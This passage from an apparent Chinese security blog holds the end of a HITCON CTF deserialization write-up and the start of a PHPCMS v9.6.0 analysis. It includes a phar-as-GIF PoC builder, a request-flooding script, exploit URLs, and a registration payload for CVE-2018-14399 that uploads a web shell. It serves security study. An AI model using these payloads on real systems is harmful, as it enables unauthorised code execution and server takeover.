<p>&#x533F;&#x540D;&#x51FD;&#x6570;&#x4F1A;&#x88AB;&#x8BBE;&#x7F6E;&#x4E3A;<code>\x00lambda_%d</code> &#xFF0C;&#x5176;&#x4E2D; <code>%d</code> &#x4E3A;&#x6570;&#x5B57;&#xFF0C;&#x53D6;&#x51B3;&#x4E8E;&#x8FDB;&#x7A0B;&#x4E2D;&#x533F;&#x540D;&#x51FD;&#x6570;&#x7684;&#x4E2A;&#x6570;&#xFF0C;&#x4F46;&#x662F;&#x6211;&#x4EEC;&#x6BCF;&#x8BBF;&#x95EE;&#x4E00;&#x6B21;&#x9898;&#x76EE;&#xFF0C;&#x5C31;&#x4F1A;&#x751F;&#x6210;&#x4E00;&#x4E2A;&#x533F;&#x540D;&#x51FD;&#x6570;&#xFF0C;&#x8FD9;&#x6837;&#x533F;&#x540D;&#x51FD;&#x6570;&#x7684;&#x540D;&#x5B57;&#x5C31;&#x4E0D;&#x53EF;&#x63A7;&#x3002;<br>&#x8FD9;&#x91CC;&#x9700;&#x8981;&#x53C2;&#x8003;: <a href="https://cloud.tencent.com/developer/article/1392036" target="_blank" rel="noopener">Apache &#x5DE5;&#x4F5C;&#x7684;&#x4E09;&#x79CD;&#x6A21;&#x5F0F;&#xFF1A;Prefork&#x3001;Worker&#x3001;Event</a><br>&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5927;&#x91CF;&#x7684;&#x8BF7;&#x6C42;&#x6765;&#x8FEB;&#x4F7F;Pre-fork&#x6A21;&#x5F0F;&#x542F;&#x52A8;&#x7684;Apache&#x542F;&#x52A8;&#x65B0;&#x7684;&#x7EBF;&#x7A0B;&#xFF0C;&#x8FD9;&#x6837;&#x8FD9;&#x91CC;&#x7684;<code>%d</code>&#x4F1A;&#x5237;&#x65B0;&#x4E3A;1&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x9884;&#x6D4B;&#x4E86;&#x3002;</p>
<blockquote>
<p>Apache-prefork&#x6A21;&#x578B;(&#x9ED8;&#x8BA4;&#x6A21;&#x578B;)&#x5728;&#x63A5;&#x53D7;&#x8BF7;&#x6C42;&#x540E;&#x4F1A;&#x5982;&#x4F55;&#x5904;&#x7406;,&#x9996;&#x5148;Apache&#x4F1A;&#x9ED8;&#x8BA4;&#x751F;&#x6210;5&#x4E2A;child server&#x53BB;&#x7B49;&#x5F85;&#x7528;&#x6237;&#x8FDE;&#x63A5;, &#x9ED8;&#x8BA4;&#x6700;&#x9AD8;&#x53EF;&#x751F;&#x6210;256&#x4E2A;child server, &#x8FD9;&#x65F6;&#x5019;&#x5982;&#x679C;&#x7528;&#x6237;&#x5927;&#x91CF;&#x8BF7;&#x6C42;, Apache&#x5C31;&#x4F1A;&#x5728;&#x5904;&#x7406;&#x5B8C;MaxRequestsPerChild&#x4E2A;tcp&#x8FDE;&#x63A5;&#x540E;kill&#x6389;&#x8FD9;&#x4E2A;&#x8FDB;&#x7A0B;,&#x5F00;&#x542F;&#x4E00;&#x4E2A;&#x65B0;&#x8FDB;&#x7A0B;&#x5904;&#x7406;&#x8BF7;&#x6C42;&#x3002;</p>
</blockquote>
<p>&#x968F;&#x540E;&#x4EE3;&#x7801;&#x521D;&#x59CB;&#x5316;&#x4E86;&#x7528;&#x6237;&#x6C99;&#x7BB1;&#x3002;</p>
<p>&#x9898;&#x76EE;&#x4E2D;&#x5E72;&#x6270;&#x6700;&#x5927;&#x7684;&#x662F;<code>check_session</code> &#x51FD;&#x6570;&#x3002;<code>check_session</code> &#x51FD;&#x6570;&#x4E2D;&#x5177;&#x6709;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x4F46;&#x662F; <code>hash_equals</code> &#x51FD;&#x6570;&#x8FDB;&#x884C;&#x4E86;&#x6570;&#x636E;&#x6821;&#x9A8C;&#xFF0C;&#x800C; <code>$SECRET</code> &#x7684;&#x503C;&#x4E0D;&#x53EF;&#x77E5;&#x3002;&#x56E0;&#x6B64;&#x65E0;&#x6CD5;&#x5229;&#x7528;&#x8FD9;&#x70B9;&#x8FDB;&#x884C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6784;&#x9020;&#x6211;&#x4EEC;&#x7684;payload</p>
<p>&#x7136;&#x540E;&#x4EE3;&#x7801;&#x6709;&#x4E24;&#x4E2A;&#x7C7B;User&#x3001;Admin&#x3002;&#x5176;&#x5206;&#x522B;&#x662F;&#x7236;&#x7C7B;&#x4E0E;&#x5B50;&#x7C7B;&#x3002;admin&#x7C7B;&#x4E2D;&#x5B58;&#x5728;&#x654F;&#x611F;&#x51FD;&#x6570;eval&#x3002;&#x7136;&#x540E;&#x662F;&#x4E00;&#x4E2A; <code>$_GET[&quot;lucky&quot;]();</code> &#x8FD9;&#x6837;&#x7684;&#x52A8;&#x6001;&#x8C03;&#x7528;&#x3002;</p>
<p>&#x540E;&#x9762;&#x4E3B;&#x8981;&#x5B9E;&#x73B0;&#x4E86;&#x4E24;&#x4E2A;&#x529F;&#x80FD;&#xFF0C;&#x4E00;&#x4E2A;&#x662F;&#x5199;&#x5165;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#xFF0C;&#x4E00;&#x4E2A;&#x662F;&#x8FD4;&#x56DE;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;&#x3002;<br>&#x4E14;&#x5BF9;&#x6587;&#x4EF6;&#x524D;&#x51E0;&#x4E2A;&#x5B57;&#x7B26;&#x8FDB;&#x884C;&#x4E86; <code>GIF89a</code> &#x7684;&#x9650;&#x5236;</p>
<p>&#x4E4B;&#x524D;&#x662F;0day&#xFF0C;&#x73B0;&#x5728;&#x5DF2;&#x7ECF;&#x6709;&#x5F88;&#x591A;&#x6587;&#x7AE0;&#x90FD;&#x5206;&#x6790;&#x8FC7; phar &#x62D3;&#x5C55;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x539F;&#x7406;&#x3002;</p>
<p>upload&#x51FD;&#x6570;&#x4E2D; <code>file_get_contents</code> &#x8FD9;&#x7C7B;&#x6587;&#x4EF6;&#x76F8;&#x5173;&#x64CD;&#x4F5C;&#x4F1A;&#x89E6;&#x53D1; phar&#xFF0C;&#x4ECE;&#x800C;&#x8FDB;&#x884C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x3002;</p>
<p>poc.php</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Admin</span> </span>{</span><br><span class="line">	<span class="hljs-keyword">public</span> $avatar = <span class="hljs-string">&apos;orz&apos;</span>;  </span><br><span class="line">} </span><br><span class="line">$p = <span class="hljs-keyword">new</span> Phar(<span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">&apos;/avatar.phar&apos;</span>, <span class="hljs-number">0</span>);</span><br><span class="line">$p[<span class="hljs-string">&apos;file.php&apos;</span>] = <span class="hljs-string">&apos;&lt;?php ?&gt;&apos;</span>;</span><br><span class="line">$p-&gt;setMetadata(<span class="hljs-keyword">new</span> Admin());</span><br><span class="line">$p-&gt;setStub(<span class="hljs-string">&apos;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&apos;</span>);</span><br><span class="line">rename(<span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">&apos;/avatar.phar&apos;</span>, <span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">&apos;/avatar.gif&apos;</span>);</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x63A5;&#x7740;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x901A;&#x8FC7;&#x5927;&#x91CF;&#x8BF7;&#x6C42;&#xFF0C;&#x4F7F; apache &#x91CD;&#x65B0;&#x5F00;&#x542F;&#x4E00;&#x4E2A;&#x65B0;&#x7684;&#x7EBF;&#x7A0B;</p>
<p>&#x8D34;&#x4E0A; @orange &#x5E08;&#x5085;&#x7684;&#x811A;&#x672C; </p>
<p></p><figure class="highlight python hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"><span class="hljs-keyword">import</span> socket</span><br><span class="line"><span class="hljs-keyword">import</span> time</span><br><span class="line"><span class="hljs-keyword">from</span> multiprocessing.dummy <span class="hljs-keyword">import</span> Pool <span class="hljs-keyword">as</span> ThreadPool</span><br><span class="line"><span class="hljs-keyword">try</span>:</span><br><span class="line">    requests.packages.urllib3.disable_warnings()</span><br><span class="line"><span class="hljs-keyword">except</span>:</span><br><span class="line">    <span class="hljs-keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span><span class="hljs-params">(i)</span>:</span></span><br><span class="line">    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:</span><br><span class="line">        HOST = <span class="hljs-string">&apos;x.x.x.x&apos;</span></span><br><span class="line">        PORT = xx</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((HOST, PORT))</span><br><span class="line">        s.sendall(<span class="hljs-string">&apos;GET /avatar.gif HTTP/1.1\nHost: yourip\nConnection: Keep-Alive\n\n&apos;</span>)</span><br><span class="line">        <span class="hljs-comment"># s.close()</span></span><br><span class="line">        <span class="hljs-keyword">print</span> <span class="hljs-string">&apos;ok&apos;</span></span><br><span class="line">        time.sleep(<span class="hljs-number">0.5</span>)</span><br><span class="line"></span><br><span class="line">i = <span class="hljs-number">8</span></span><br><span class="line">pool = ThreadPool( i )</span><br><span class="line">result = pool.map_async( run, range(i) ).get(<span class="hljs-number">0xffff</span>)</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x52A0;&#x8F7D;&#x6211;&#x4EEC;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x7684;phar&#x6587;&#x4EF6;<br><a href="http://117.50.3.97:8005/index.php?m=upload&amp;url=http://ip&apos;" target="_blank" rel="noopener">http://117.50.3.97:8005/index.php?m=upload&amp;url=http://ip&apos;</a></p>
<p>&#x5229;&#x7528;&#x811A;&#x672C;&#x53D1;&#x51FA;&#x5927;&#x91CF;&#x8BF7;&#x6C42;&#xFF0C;&#x4F7F; apache &#x91CD;&#x65B0;&#x5F00;&#x542F;&#x4E00;&#x4E2A;&#x65B0;&#x7684;&#x7EBF;&#x7A0B;</p>
<p>&#x6700;&#x540E;&#x8BBF;&#x95EE;<br><a href="http://117.50.3.97:8005/index.php?m=upload&amp;url=phar:///var/www/data/xxx/&amp;lucky=%00lambda_1" target="_blank" rel="noopener">http://117.50.3.97:8005/index.php?m=upload&amp;url=phar:///var/www/data/xxx/&amp;lucky=%00lambda_1</a></p>
<p><img src="/2020/02/17/HITCON-%E4%B8%89%E9%A2%98%E9%80%92%E8%BF%9B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201113200356402.png" alt="image-20201113200356402"></p>
<h1 id="HITCON-2018"><a href="#HITCON-2018" class="headerlink" title="HITCON 2018"></a>HITCON 2018</h1><h2 id="&#x5F85;&#x66F4;&#x65B0;&#x2026;"><a href="#&#x5F85;&#x66F4;&#x65B0;&#x2026;" class="headerlink" title="&#x5F85;&#x66F4;&#x65B0;&#x2026;"></a>&#x5F85;&#x66F4;&#x65B0;&#x2026;</h2></body></html>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>PHPCMS v9.6.0 两个漏洞分析</title>
    <url>/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<html><head></head><body><p>&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#xFF08;CVE-2018-14399&#xFF09; + wap&#x6A21;&#x5757; SQL&#x6CE8;&#x5165;</p>
<a id="more"></a>



<h2 id="&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#xFF08;CVE-2018-14399&#xFF09;"><a href="#&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#xFF08;CVE-2018-14399&#xFF09;" class="headerlink" title="&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#xFF08;CVE-2018-14399&#xFF09;"></a>&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#xFF08;CVE-2018-14399&#xFF09;</h2><h3 id="&#x6F0F;&#x6D1E;&#x590D;&#x73B0;"><a href="#&#x6F0F;&#x6D1E;&#x590D;&#x73B0;" class="headerlink" title="&#x6F0F;&#x6D1E;&#x590D;&#x73B0;"></a>&#x6F0F;&#x6D1E;&#x590D;&#x73B0;</h3><p><strong>&#x6F0F;&#x6D1E;&#x5371;&#x5BB3;&#xFF1A;&#x8BE5;&#x6F0F;&#x6D1E;&#x53EF;&#x4EE5;&#x5728;&#x7528;&#x6237;&#x6CE8;&#x518C;&#x754C;&#x9762;&#x4EE5;&#x672A;&#x6388;&#x6743;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x5B9E;&#x73B0;&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x3002;</strong></p>
<p>&#x6F0F;&#x6D1E;&#x89E6;&#x53D1;&#x4F4D;&#x7F6E;&#x5728; &#x4F1A;&#x5458;&#x6CE8;&#x518C; &#x8FD9;&#x4E2A;&#x754C;&#x9762;&#x3002;&#x5730;&#x5740;&#x4E3A; <code>ip/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1</code><br><img src="/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/6OIr5YgRujmoJa1-20201117115107536.jpg" alt></p>
<p>POST&#x53C2;&#x6570;&#x5982;&#x4E0B;</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><span class="line">siteid=1&amp;modelid=11&amp;username=P2hm1n&amp;password=P2hm1n&amp;email=123456@qq.com&amp;info[content]=&lt;img src=&#x4F60;&#x7684;shell&gt;&amp;dosubmit=1&amp;protocol=</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/gfY8KknGSrRtO7M-20201117115107490.jpg" alt></p>
<p>&#x8BBF;&#x95EE;&#x7206;&#x51FA;&#x4E0A;&#x4F20;&#x5730;&#x5740;<br><img src="/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/pMFCXVQycNb6RjU-20201117115107549.jpg" alt></p>
<p>&#x80FD;shell</p>
<p><img src="/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/BUloO1A9ujR256I-20201117115107256.png" alt></p>
<h3 id="&#x6F0F;&#x6D1E;&#x5206;&#x6790;"><a href="#&#x6F0F;&#x6D1E;&#x5206;&#x6790;" class="headerlink" title="&#x6F0F;&#x6D1E;&#x5206;&#x6790;"></a>&#x6F0F;&#x6D1E;&#x5206;&#x6790;</h3><p>&#x6587;&#x4EF6;&#x76EE;&#x5F55; <code>phpcms/modules/member/index.php</code></p>
<p><code>index.php</code> &#x5927;&#x81F4;&#x5B9E;&#x73B0;&#x529F;&#x80FD;&#xFF1A;&#x4F1A;&#x5458;&#x524D;&#x53F0;&#x7BA1;&#x7406;&#x4E2D;&#x5FC3;&#x3001;&#x8D26;&#x53F7;&#x7BA1;&#x7406;&#x3001;&#x6536;&#x85CF;&#x64CD;&#x4F5C;&#x7C7B;</p>
<p>&#x89E6;&#x53D1;&#x6F0F;&#x6D1E;&#x70B9;&#x65B9;&#x6CD5;&#x662F; <code>register</code> &#x5927;&#x81F4;&#x903B;&#x8F91;&#x662F; &#x83B7;&#x53D6;&#x7528;&#x6237;siteid&#xFF0C;&#x5B9A;&#x4E49;&#x7AD9;&#x70B9;id&#x5E38;&#x91CF;&#xFF0C;&#x52A0;&#x8F7D;&#x7528;&#x6237;&#x6A21;&#x5757;&#x914D;&#x7F6E;&#xFF0C;&#x52A0;&#x8F7D;&#x77ED;&#x4FE1;&#x6A21;&#x5757;&#x914D;&#x7F6E;</p>
<p>&#x7B2C; 134-135 &#x884C; &#x53D1;&#x73B0;&#x53EF;&#x63A7;&#x53D8;&#x91CF; <code>$_POST[&#x2018;info&#x2019;]</code> &#x7ECF;&#x8FC7;&#x6F0F;&#x6D1E;&#x590D;&#x73B0;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x77E5;&#x9053;&#x8FD9;&#x662F; exp &#x7684;&#x5173;&#x952E;&#x53C2;&#x6570;</p>
<p>&#x5148;&#x770B; 134 &#x884C;&#x7684;&#x5904;&#x7406;&#xFF0C;&#x5C06; <code>$_POST[&#x2018;info&#x2019;]</code> &#x8FD9;&#x4E2A;&#x53C2;&#x6570;&#x7ECF;&#x8FC7;&#x4E86;<code>new_html_special_chars</code>&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x8FC7;&#x6EE4;&#x3002;&#x8DDF;&#x8FDB;&#x51FD;&#x6570;&#x5206;&#x6790;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-comment">/**</span></span><br><span class="line"><span class="hljs-comment"> * &#x8FD4;&#x56DE;&#x7ECF;addslashe&#x5904;&#x7406;&#x8FC7;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x6216;&#x6570;&#x7EC4;</span></span><br><span class="line"><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> $obj &#x9700;&#x8981;&#x5904;&#x7406;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x6216;&#x6570;&#x7EC4;</span></span><br><span class="line"><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> mixed</span></span><br><span class="line"><span class="hljs-comment"> */</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">new_html_special_chars</span><span class="hljs-params">($string)</span> </span>{</span><br><span class="line">	$encoding = <span class="hljs-string">&apos;utf-8&apos;</span>;</span><br><span class="line">	<span class="hljs-keyword">if</span>(strtolower(CHARSET)==<span class="hljs-string">&apos;gbk&apos;</span>) $encoding = <span class="hljs-string">&apos;gb2312&apos;</span>;</span><br><span class="line">	<span class="hljs-keyword">if</span>(!is_array($string)) <span class="hljs-keyword">return</span> htmlspecialchars($string,ENT_COMPAT,$encoding);</span><br><span class="line">	<span class="hljs-keyword">foreach</span>($string <span class="hljs-keyword">as</span> $key =&gt; $val) $string[$key] = new_html_special_chars($val);</span><br><span class="line">	<span class="hljs-keyword">return</span> $string;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x4E3B;&#x8981;&#x529F;&#x80FD;&#x662F;&#x505A;&#x4E86; html &#x8F6C;&#x4E49;&#x3002;&#x5BF9;&#x6211;&#x4EEC;&#x6F0F;&#x6D1E;&#x5229;&#x7528;&#x6CA1;&#x6709;&#x592A;&#x5927;&#x963B;&#x788D;&#x3002;&#x63A5;&#x7740;&#x8DDF;&#x8FDB;&#x4E00;&#x4E0B; 135&#x884C;&#x7684; <code>$member_input-&gt;get()</code> &#x65B9;&#x6CD5;<br><img src="/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/5XIC1okjlf2PMJQ-20201117115108205.jpg" alt></p>
<p>&#x65B9;&#x6CD5;&#x4F4D;&#x7F6E;&#xFF1A;<code>caches/caches_model/caches_data/member_input.class.php</code></p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span><span class="hljs-params">($data)</span> </span>{</span><br><span class="line">	<span class="hljs-keyword">$this</span>-&gt;data = $data = trim_script($data);</span><br><span class="line">	$model_cache = getcache(<span class="hljs-string">&apos;member_model&apos;</span>, <span class="hljs-string">&apos;commons&apos;</span>);</span><br><span class="line">	<span class="hljs-keyword">$this</span>-&gt;db-&gt;table_name = <span class="hljs-keyword">$this</span>-&gt;db_pre.$model_cache[<span class="hljs-keyword">$this</span>-&gt;modelid][<span class="hljs-string">&apos;tablename&apos;</span>];</span><br><span class="line"></span><br><span class="line">	$info = <span class="hljs-keyword">array</span>();</span><br><span class="line">	$debar_filed = <span class="hljs-keyword">array</span>(<span class="hljs-string">&apos;catid&apos;</span>,<span class="hljs-string">&apos;title&apos;</span>,<span class="hljs-string">&apos;style&apos;</span>,<span class="hljs-string">&apos;thumb&apos;</span>,<span class="hljs-string">&apos;status&apos;</span>,<span class="hljs-string">&apos;islink&apos;</span>,<span class="hljs-string">&apos;description&apos;</span>);</span><br><span class="line">	<span class="hljs-keyword">if</span>(is_array($data)) {</span><br><span class="line">		<span class="hljs-keyword">foreach</span>($data <span class="hljs-keyword">as</span> $field=&gt;$value) {</span><br><span class="line">			<span class="hljs-keyword">if</span>($data[<span class="hljs-string">&apos;islink&apos;</span>]==<span class="hljs-number">1</span> &amp;&amp; !in_array($field,$debar_filed)) <span class="hljs-keyword">continue</span>;</span><br><span class="line">			$field = safe_replace($field);</span><br><span class="line">			$name = <span class="hljs-keyword">$this</span>-&gt;fields[$field][<span class="hljs-string">&apos;name&apos;</span>];</span><br><span class="line">			$minlength = <span class="hljs-keyword">$this</span>-&gt;fields[$field][<span class="hljs-string">&apos;minlength&apos;</span>];</span><br><span class="line">			$maxlength = <span class="hljs-keyword">$this</span>-&gt;fields[$field][<span class="hljs-string">&apos;maxlength&apos;</span>];</span><br><span class="line">			$pattern = <span class="hljs-keyword">$this</span>-&gt;fields[$field][<span class="hljs-string">&apos;pattern&apos;</span>];</span><br><span class="line">			$errortips = <span class="hljs-keyword">$this</span>-&gt;fields[$field][<span class="hljs-string">&apos;errortips&apos;</span>];</span><br><span class="line">			<span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>($errortips)) $errortips = <span class="hljs-string">&quot;$name &#x4E0D;&#x7B26;&#x5408;&#x8981;&#x6C42;&#xFF01;&quot;</span>;</span><br><span class="line">			$length = <span class="hljs-keyword">empty</span>($value) ? <span class="hljs-number">0</span> : strlen($value);</span><br><span class="line">			<span class="hljs-keyword">if</span>($minlength &amp;&amp; $length &lt; $minlength &amp;&amp; !$isimport) showmessage(<span class="hljs-string">&quot;$name &#x4E0D;&#x5F97;&#x5C11;&#x4E8E; $minlength &#x4E2A;&#x5B57;&#x7B26;&#xFF01;&quot;</span>);</span><br><span class="line">			<span class="hljs-keyword">if</span> (!array_key_exists($field, <span class="hljs-keyword">$this</span>-&gt;fields)) showmessage(<span class="hljs-string">&apos;&#x6A21;&#x578B;&#x4E2D;&#x4E0D;&#x5B58;&#x5728;&apos;</span>.$field.<span class="hljs-string">&apos;&#x5B57;&#x6BB5;&apos;</span>);</span><br><span class="line">			<span class="hljs-keyword">if</span>($maxlength &amp;&amp; $length &gt; $maxlength &amp;&amp; !$isimport) {</span><br><span class="line">				showmessage(<span class="hljs-string">&quot;$name &#x4E0D;&#x5F97;&#x8D85;&#x8FC7; $maxlength &#x4E2A;&#x5B57;&#x7B26;&#xFF01;&quot;</span>);</span><br><span class="line">			} <span class="hljs-keyword">else</span> {</span><br><span class="line">				str_cut($value, $maxlength);</span><br><span class="line">			}</span><br><span class="line">			<span class="hljs-keyword">if</span>($pattern &amp;&amp; $length &amp;&amp; !preg_match($pattern, $value) &amp;&amp; !$isimport) showmessage($errortips);</span><br><span class="line">            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;fields[$field][<span class="hljs-string">&apos;isunique&apos;</span>] &amp;&amp; <span class="hljs-keyword">$this</span>-&gt;db-&gt;get_one(<span class="hljs-keyword">array</span>($field=&gt;$value),$field) &amp;&amp; ROUTE_A != <span class="hljs-string">&apos;edit&apos;</span>) showmessage(<span class="hljs-string">&quot;$name &#x7684;&#x503C;&#x4E0D;&#x5F97;&#x91CD;&#x590D;&#xFF01;&quot;</span>);</span><br><span class="line">			$func = <span class="hljs-keyword">$this</span>-&gt;fields[$field][<span class="hljs-string">&apos;formtype&apos;</span>];</span><br><span class="line">			<span class="hljs-keyword">if</span>(method_exists(<span class="hljs-keyword">$this</span>, $func)) $value = <span class="hljs-keyword">$this</span>-&gt;$func($field, $value);</span><br><span class="line"></span><br><span class="line">			$info[$field] = $value;</span><br><span class="line">		}</span><br><span class="line">	}</span><br><span class="line">	<span class="hljs-keyword">return</span> $info;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x9996;&#x5148;&#x5C06; data &#x7ECF;&#x8FC7;&#x4E00;&#x4E2A; <code>trim_script</code> &#x7684;&#x5904;&#x7406;&#x3002;&#x4F46;&#x662F; <code>trim_script</code> &#x5927;&#x591A;&#x90FD;&#x662F;&#x5904;&#x7406; xss &#x6709;&#x5173;&#x6F0F;&#x6D1E;&#x7684;&#x8FC7;&#x6EE4;&#x3002;&#x51E0;&#x4E2A;&#x6B63;&#x5219;&#x5C06;xss&#x7684;&#x5173;&#x952E; payload &#x8FDB;&#x884C;&#x4E86;&#x66FF;&#x6362;</p>
<p><img src="/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/nqCsx4wp8uX2MWl-20201117115107457.png" alt></p>
<p>&#x7B2C;27&#x884C;&#xFF0C;&#x6838;&#x5FC3; if &#x5224;&#x65AD;&#x6761;&#x4EF6; <code>if(is_array($data))</code> &#x3002;&#x6211;&#x4EEC; payload &#x4E2D; <code>info[content]=&lt;img src=&#x4F60;&#x7684;shell&gt;</code> &#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x6570;&#x7EC4;&#x3002;&#x56E0;&#x6B64;&#x7EE7;&#x7EED;&#x8DDF;&#x8FDB;&#xFF0C;&#x53D1;&#x73B0;&#x5C06;&#x6570;&#x7EC4;&#x8FDB;&#x884C;&#x904D;&#x5386;&#xFF0C;&#x952E;&#x540D;&#x4E3A;<code>$field</code>&#xFF0C;&#x952E;&#x503C;&#x4E3A;<code>$value</code></p>
<p>&#x7B2C;30&#x884C;&#xFF0C;<code>$field</code> &#x8FDB;&#x884C;&#x4E00;&#x6B21; <code>safe_replace</code> &#x5904;&#x7406;&#x3002;&#x4E3B;&#x8981;&#x8FC7;&#x6EE4;&#x4E00;&#x4E9B;&#x7C7B;&#x4F3C;&#x5355;&#x5F15;&#x53F7;&#xFF0C;&#x5C16;&#x62EC;&#x53F7;&#x7B49;&#x53EF;&#x80FD;&#x4EA7;&#x751F; XSS&#xFF0C;SQL&#x6CE8;&#x5165;&#x7684;&#x7B26;&#x53F7;<br><img src="/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/AJSbqUtg7T63PGZ-20201117115107732.png" alt="image.png"></p>
<p>&#x4E4B;&#x540E;&#x7ECF;&#x8FC7;&#x4E00;&#x4E9B;&#x6CE8;&#x518C;&#x65F6;&#x6B63;&#x5E38;&#x7684;&#x5224;&#x65AD;&#x903B;&#x8F91;&#x4EE3;&#x7801;</p>
<p>47-48&#x884C;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line">$func = <span class="hljs-keyword">$this</span>-&gt;fields[$field][<span class="hljs-string">&apos;formtype&apos;</span>];</span><br><span class="line"><span class="hljs-keyword">if</span>(method_exists(<span class="hljs-keyword">$this</span>, $func)) $value = <span class="hljs-keyword">$this</span>-&gt;$func($field, $value);</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x5148;&#x662F;&#x5B9A;&#x4E49;&#x4E86;&#x4E00;&#x4E2A; <code>$func</code> &#xFF0C;&#x7136;&#x540E;&#x4E0B;&#x9762;&#x7684;if&#x8BED;&#x53E5;&#x5224;&#x65AD;&#x65B9;&#x6CD5;&#x5982;&#x679C;&#x5B58;&#x5728;&#x5C31;&#x5E26;&#x5165;&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x3002;</p>
<p>&#x6328;&#x4E2A;&#x67E5;&#x770B;&#x65B9;&#x6CD5;&#x4E2D;&#xFF0C;&#x5728; <code>editor</code> &#x65B9;&#x6CD5;&#x4E2D; &#x7684;&#x4E00;&#x53E5;&#x8BDD;&#x3002;&#x8C03;&#x7528;&#x4E86; <code>attachment</code> &#x7C7B;&#x7684; <code>download</code> &#x51FD;&#x6570;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line">$value = <span class="hljs-keyword">$this</span>-&gt;attachment-&gt;download(<span class="hljs-string">&apos;content&apos;</span>, $value,$watermark_enable);</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x8DDF;&#x8FDB;&#x6587;&#x4EF6; <code>phpcms/libs/classes/attachment.class.php</code></p>
